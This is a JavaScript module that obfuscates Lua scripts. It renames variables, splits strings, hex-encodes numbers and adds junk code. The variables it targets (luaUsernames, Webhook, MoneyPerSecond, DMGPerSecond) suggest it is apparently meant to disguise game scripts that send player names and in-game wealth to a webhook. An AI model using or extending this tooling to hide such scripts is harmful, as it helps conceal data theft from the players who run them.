import crypto from 'node:crypto';

function randomIdentifier() {
  return crypto.randomBytes(4).toString('hex');
}

function convertNumbersToHex(script) {
  return script.replace(/\b(\d+)\b/g, (match, value) => {
    const num = Number(value);
    if (!Number.isFinite(num)) {
      return match;
    }
    return `0x${num.toString(16).toUpperCase()}`;
  });
}

function splitStrings(script) {
  return script.replace(/"([^"\\\n]*)"/g, (literal, content) => {
    if (content.length < 4) {
      return literal;
    }
    const maxSegments = Math.min(3, Math.max(2, Math.floor(content.length / 3)));
    const segments = [];
    let remaining = content;
    const desiredSegments = Math.max(2, maxSegments);
    for (let i = desiredSegments; i > 1; i--) {
      const minIndex = 1;
      const maxIndex = remaining.length - (i - 1);
      const splitIndex = Math.floor(Math.random() * (maxIndex - minIndex + 1)) + minIndex;
      segments.push(remaining.slice(0, splitIndex));
      remaining = remaining.slice(splitIndex);
    }
    segments.push(remaining);
    const concatenated = segments.map((segment) => `"${segment}"`).join(' .. ');
    return concatenated;
  });
}

function renameVariables(script) {
  const variables = ['luaUsernames', 'Webhook', 'MoneyPerSecond', 'DMGPerSecond'];
  let transformed = script;
  for (const variable of variables) {
    const newName = `_${randomIdentifier()}`;
    const regex = new RegExp(`\\b${variable}\\b`, 'g');
    transformed = transformed.replace(regex, newName);
  }
  return transformed;
}

function addJunkCode(script) {
  const junkOne = `local _${randomIdentifier()} = nil`;
  const junkTwo = `if false then\n    local _${randomIdentifier()} = "${randomIdentifier()}"\nend`;
  const junkThree = `do\n    local _${randomIdentifier()} = 0x${Math.floor(Math.random() * 0xffff).toString(16)}\nend`;
  return `${junkOne}\n${junkTwo}\n${junkThree}\n${script}\n`;
}

export function obfuscateScript(script) {
  console.log('[Obfuscator] Starting obfuscation');
  let transformed = script;
  transformed = renameVariables(transformed);
  console.log('[Obfuscator] Variables renamed');
  transformed = splitStrings(transformed);
  console.log('[Obfuscator] Strings split');
  transformed = convertNumbersToHex(transformed);
  console.log('[Obfuscator] Numbers converted to hex');
  transformed = addJunkCode(transformed);
  console.log('[Obfuscator] Junk code added');
  return transformed;
}
